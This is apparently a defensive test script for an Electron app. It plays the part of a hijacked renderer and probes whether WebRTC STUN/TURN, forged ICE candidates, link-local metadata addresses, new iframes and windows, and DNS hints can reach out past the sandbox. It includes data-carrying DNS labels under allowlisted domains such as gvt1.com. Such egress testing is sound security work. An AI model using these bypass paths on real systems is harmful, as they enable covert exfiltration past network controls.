/**
 * WebRTC の外向き通信を構造的に塞げるかの試験（NIR-1 の Y-1 の続き）。乗っ取られた renderer 相当の
 * JS として、RTCPeerConnection の iceServers に stun／stuns／turn（udp／tcp）／turns を渡す。
 * `webrtc-block-probe-main.mjs` が `webContents.executeJavaScript` で実行する。
 *
 * 引数: globalThis.__probe = { nonce, ports: { p, q, r, s, t }, lan, quick }
 *   p: 127.0.0.1 の canary（名前の host もここへ解決される）／q: 127.0.0.1 の別 port の canary
 *   r: 127.0.0.2 の canary／s: [::1] の canary／t: LAN の IPv4 の canary
 * 戻り値: Promise<Array<{id, outcome, startedAt, endedAt}>>
 */
(async () => {
  const { nonce, ports, lan, quick } = globalThis.__probe;
  const results = [];
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const settle = async (id, fn, ms = 4000) => {
    const startedAt = Date.now();
    let outcome;
    try {
      outcome = String(
        await Promise.race([fn(), wait(ms).then(() => "timeout")]),
      );
    } catch (error) {
      outcome = `error:${error?.name ?? "Error"}:${String(error?.message ?? "").slice(0, 120)}`;
    }
    await wait(300);
    results.push({ id, outcome, startedAt, endedAt: Date.now() });
  };

  // host の形ごとの (host, port)。name は *.probe.test（resolver rules で 127.0.0.1 へ解決される）。
  const hostFor = (form, id) =>
    ({
      name: [`${id}-${nonce}.probe.test`, ports.p],
      allowed: [`allowed-${id}-${nonce}.probe.test`, ports.q],
      lo4: ["127.0.0.1", ports.q],
      lo4b: ["127.0.0.2", ports.r],
      lo6: ["[::1]", ports.s],
      lan: [lan, ports.t],
      lo4n: ["127.0.0.1", ports.p],
      allowedp: [`allowed-${id}-${nonce}.probe.test`, ports.p],
      ext: [`ext-${id}-${nonce}.blocked.invalid`, 443],
      localhost: ["localhost", ports.p],
    })[form];
  const urlsFor = (proto, h, port) =>
    ({
      stun: `stun:${h}:${port}`,
      stuns: `stuns:${h}:${port}`,
      "turn-udp": `turn:${h}:${port}?transport=udp`,
      "turn-tcp": `turn:${h}:${port}?transport=tcp`,
      turns: `turns:${h}:${port}`,
      "turns-tcp": `turns:${h}:${port}?transport=tcp`,
    })[proto];

  const rtcAttempt = async (RTC, proto, h, port, extra = {}) => {
    const server = { urls: urlsFor(proto, h, port) };
    if (proto.startsWith("turn")) {
      server.username = "SECRET-user";
      server.credential = "SECRET-cred";
    }
    const pc = new RTC({ iceServers: [server], ...extra });
    pc.createDataChannel("probe");
    await pc.setLocalDescription(await pc.createOffer());
    await wait(1700);
    const state = pc.iceGatheringState;
    pc.close();
    return `gathering:${state}`;
  };

  // ── 対照 ─────────────────────────────────────────────────────────────
  await settle("control.same-origin-fetch", async () => {
    const res = await fetch("/index.html");
    return `status:${res.status}`;
  });
  // 通常の http の fetch（CSP の connect-src で止まる。net 層まで届かない）。proxy の効きの対照は別に出す。
  await settle("control.bundled-worker", () =>
    new Promise((resolve) => {
      try {
        const w = new Worker("/assets/probe-worker.js");
        w.onmessage = (e) => resolve(String(e.data));
        w.onerror = () => resolve("worker-error");
        w.postMessage("x");
      } catch (e) {
        resolve(`throw:${e.name}`);
      }
    }),
  );
  await settle("control.rtc-defined", async () => typeof RTCPeerConnection);

  // ── main world の全 variant ───────────────────────────────────────────
  const protos = ["stun", "stuns", "turn-udp", "turn-tcp", "turns", "turns-tcp"];
  const forms = quick
    ? ["name", "lo4"]
    : ["name", "allowed", "allowedp", "ext", "lo4", "lo4b", "lo6", "lan"];
  if (globalThis.__probe.localhost && !quick) forms.push("localhost");
  for (const form of forms) {
    for (const proto of protos) {
      const id = `main.${proto}.${form}`;
      const [h, port] = hostFor(form, `${proto.replace(/[^a-z]/g, "")}${form}`);
      await settle(id, () => rtcAttempt(RTCPeerConnection, proto, h, port));
    }
  }

  // ── 攻撃者が作る remote candidate（iceServers を使わない経路）への connectivity check ──
  const remoteCandidate = async (RTC, line) => {
    const pc = new RTC({});
    pc.createDataChannel("probe");
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    let sdp = offer.sdp.replace("a=setup:actpass", "a=setup:active");
    sdp = sdp.replace(/(\r?\n)?$/, "\r\n") + "";
    // m=application の section の末尾に candidate を足す
    sdp = sdp.replace(/(a=sctp-port:\d+\r\n)/, `$1a=ice-ufrag:abcd\r\na=ice-pwd:0123456789012345678901234\r\n${line}\r\n`);
    try {
      await pc.setRemoteDescription({ type: "answer", sdp });
    } catch (e) {
      pc.close();
      return `setRemoteDescription-failed:${e.name}`;
    }
    await wait(2200);
    const st = pc.iceConnectionState;
    pc.close();
    return `ice:${st}`;
  };
  for (const [form, ip, port] of [
    ["lo4", "127.0.0.1", ports.q],
    ["lan", lan, ports.t],
  ]) {
    await settle(`main.remote-candidate-udp.${form}`, () =>
      remoteCandidate(RTCPeerConnection, `a=candidate:1 1 udp 2113937151 ${ip} ${port} typ host`), 6000);
    await settle(`main.remote-candidate-tcp.${form}`, () =>
      remoteCandidate(RTCPeerConnection, `a=candidate:2 1 tcp 1518280447 ${ip} ${port} typ host tcptype passive`), 6000);
  }

  // ── link-local（K3/3 R12）: canary を置けない宛先。合否は行ごとの proxy 宛の数と ICE の状態で決める ──
  // 169.254.169.254（IPv4 の link-local）と [fe80::1]（IPv6 の link-local）。受け手を置けないので leaked は常に 0 になる
  if (globalThis.__probe.linklocal) {
    for (const [form, h] of [["ll4", "169.254.169.254"], ["ll6", "[fe80::1]"]]) {
      for (const proto of protos) {
        await settle(`ll.${proto}.${form}`, () => rtcAttempt(RTCPeerConnection, proto, h, 3478));
      }
    }
    for (const [form, ip] of [["ll4", "169.254.169.254"], ["ll6", "fe80::1"]]) {
      await settle(`ll.remote-candidate-udp.${form}`, () =>
        remoteCandidate(RTCPeerConnection, `a=candidate:1 1 udp 2113937151 ${ip} 3478 typ host`), 6000);
      await settle(`ll.remote-candidate-tcp.${form}`, () =>
        remoteCandidate(RTCPeerConnection, `a=candidate:2 1 tcp 1518280447 ${ip} 3478 typ host tcptype passive`), 6000);
    }
  }

  // ── 新しい realm（iframe、about:blank、srcdoc、blob、window.open）──────────────
  const realmRtc = async (id, getWindow, forms2 = ["name", "lo4"]) => {
    for (const form of forms2) {
      for (const proto of ["turn-tcp", "turns", "stun"]) {
        const [h, port] = hostFor(form, `r${id.replace(/[^a-z]/g, "")}${proto.replace(/[^a-z]/g, "")}${form}`);
        await settle(`realm.${id}.${proto}.${form}`, async () => {
          const w = await getWindow();
          if (!w) return "no-window";
          if (typeof w.RTCPeerConnection === "undefined") return "rtc-undefined";
          return rtcAttempt(w.RTCPeerConnection, proto, h, port);
        });
      }
    }
  };
  const mkFrame = async (attrs) => {
    const f = document.createElement("iframe");
    Object.assign(f, attrs);
    const loaded = new Promise((r) => (f.onload = r));
    document.body.append(f);
    await Promise.race([loaded, wait(1500)]);
    return f.contentWindow;
  };
  await realmRtc("iframe-html", () => mkFrame({ src: "/index.html" }));
  await realmRtc("iframe-blank", () => mkFrame({}));
  await realmRtc("iframe-srcdoc", () => mkFrame({ srcdoc: "<p>x</p>" }));
  await realmRtc("iframe-json", () => mkFrame({ src: "/assets/data.json" }), ["name"]);
  await realmRtc("iframe-notfound", () => mkFrame({ src: "/assets/nope.js" }), ["name"]);
  await realmRtc("iframe-blob", () =>
    mkFrame({
      src: URL.createObjectURL(new Blob(["<p>b</p>"], { type: "text/html" })),
    }),
    ["name"],
  );
  await realmRtc("window-open", async () => window.open("about:blank"), ["name"]);
  await settle("realm.worker-rtc-defined", () =>
    new Promise((resolve) => {
      const src = URL.createObjectURL(
        new Blob(["postMessage(typeof RTCPeerConnection)"], {
          type: "text/javascript",
        }),
      );
      try {
        const w = new Worker(src);
        w.onmessage = (e) => resolve(`worker:${e.data}`);
        w.onerror = () => resolve("worker-error");
      } catch (e) {
        resolve(`throw:${e.name}`);
      }
    }),
  );
  // ── 許可先（AL-1）の挙動: *.gvt1.com:443 は直接（proxy に向かない）、別 port は proxy ──────
  if (globalThis.__probe.gvt1) {
    for (const [tag, port] of [["443", 443], ["8443", 8443]]) {
      for (const proto of ["turn-tcp", "turns"]) {
        const h = `gvt1probe${proto.replace(/[^a-z]/g, "")}${tag}-${nonce}.gvt1.com`;
        await settle(`gvt1.${proto}.${tag}`, () => rtcAttempt(RTCPeerConnection, proto, h, port));
      }
    }
  }

  // ── RS-1（更新の GitHub の 3 host と localhost）を TURN／STUN の host にした行と、その名前への dns-prefetch ──
  // 期待値: canary への到達 0、TCP は proxy 宛、UDP 系は proxy 0（K3/3 R8）。名前そのものは固定で、攻撃者が選べる文字がない
  if (globalThis.__probe.rs1) {
    for (const host of ["github.com", "objects.githubusercontent.com", "release-assets.githubusercontent.com", "localhost"]) {
      for (const proto of ["stun", "turn-udp", "turn-tcp", "turns"]) {
        await settle(`rs1.${proto}.${host}`, () => rtcAttempt(RTCPeerConnection, proto, host, proto === "turns" ? 443 : 3478));
      }
      await settle(`rs1.dns-prefetch.${host}`, async () => {
        const l = document.createElement("link");
        l.rel = "dns-prefetch";
        l.href = `//${host}`;
        document.head.append(l);
        await wait(900);
        return "link:dns-prefetch";
      }, 3000);
    }
  }

  // ── DNS だけが出る経路（名前解決の観測用。DNS の記録層で見る。--dns-log で有効）────────────
  if (globalThis.__probe.dns) {
    const hint = (id, rel, mk, extra = {}) =>
      settle(id, async () => {
        const l = document.createElement("link");
        l.rel = rel;
        l.href = mk(`${id.replace(/[^a-z0-9]/g, "")}-${nonce}.dnsprobe.test`);
        Object.assign(l, extra);
        document.head.append(l);
        await wait(900);
        return `link:${rel}`;
      }, 3000);
    await hint("dns.dns-prefetch", "dns-prefetch", (h) => `//${h}`);
    await hint("dns.preconnect", "preconnect", (h) => `https://${h}`);
    await hint("dns.preconnect-http", "preconnect", (h) => `http://${h}`);
    await hint("dns.prefetch", "prefetch", (h) => `https://${h}/x`);
    await hint("dns.modulepreload", "modulepreload", (h) => `https://${h}/x.js`);
    await hint("dns.stylesheet", "stylesheet", (h) => `https://${h}/x.css`);
    await settle("dns.img", async () => {
      const i = new Image(); i.src = `https://img-${nonce}.dnsprobe.test/x.png`; await wait(900); return "img";
    }, 3000);
    await settle("dns.fetch", async () => {
      try { await fetch(`https://fetch-${nonce}.dnsprobe.test/x`); } catch (e) { return `fetch:${e.name}`; } return "fetch:ok";
    }, 3000);
    await settle("dns.websocket", async () => {
      try { new WebSocket(`wss://ws-${nonce}.dnsprobe.test/x`); } catch (e) { return `ws:${e.name}`; } await wait(900); return "ws";
    }, 3000);
    await settle("dns.a-ping", async () => {
      const a = document.createElement("a");
      a.href = "/index.html#x"; a.ping = `https://ping-${nonce}.dnsprobe.test/x`; a.target = "_blank";
      document.body.append(a); a.click(); await wait(900); return "a-ping";
    }, 3000);
    await settle("dns.iframe-http", async () => {
      await mkFrame({ src: `https://iframe-${nonce}.dnsprobe.test/x` }); await wait(600); return "iframe-http";
    }, 4000);
    await settle("dns.form-submit", async () => {
      const f = document.createElement("form");
      f.action = `https://form-${nonce}.dnsprobe.test/x`; f.method = "post"; f.target = "_blank";
      document.body.append(f); try { f.submit(); } catch (e) { return `form:${e.name}`; } await wait(900); return "form";
    }, 3000);
    // 1 つの RTCPeerConnection に載せる名前の数（並列に何名まで引かれるか）
    const many = async (id, urlsOf, n) => {
      await settle(id, async () => {
        const servers = urlsOf(n);
        const pc = new RTCPeerConnection({ iceServers: servers });
        pc.createDataChannel("probe");
        await pc.setLocalDescription(await pc.createOffer());
        await wait(2500);
        pc.close();
        return `servers:${n}`;
      }, 6000);
    };
    await many("dns.many-turn-tcp30", (n) => Array.from({ length: n }, (_, i) => ({
      urls: `turn:m${i}-${nonce}.dnsprobe.test:3478?transport=tcp`, username: "u", credential: "c" })), 30);
    await many("dns.many-turns8", (n) => [{
      urls: Array.from({ length: n }, (_, i) => `turns:s${i}-${nonce}.dnsprobe.test:443`), username: "u", credential: "c" }], 8);
    const lab = "x".repeat(60);
    await many("dns.long-name190", () => [{
      urls: `turn:${lab}.${lab}.${lab}.${nonce}.dnsprobe.test:443?transport=tcp`, username: "u", credential: "c" }], 1);
    // 許可先（辞書の host）への名前: 解決されるか（label を載せられるか）
    await many("dns.gvt1-label", () => [{
      urls: `turn:data-${nonce}.gvt1.com:443?transport=tcp`, username: "u", credential: "c" }], 1);
    await many("dns.github-label", () => [{
      urls: `turn:data-${nonce}.githubusercontent.com:443?transport=tcp`, username: "u", credential: "c" }], 1);
    await many("dns.public-example", () => [{
      urls: `turn:example.org:443?transport=tcp`, username: "u", credential: "c" }], 1);
  }
  return results;
})()
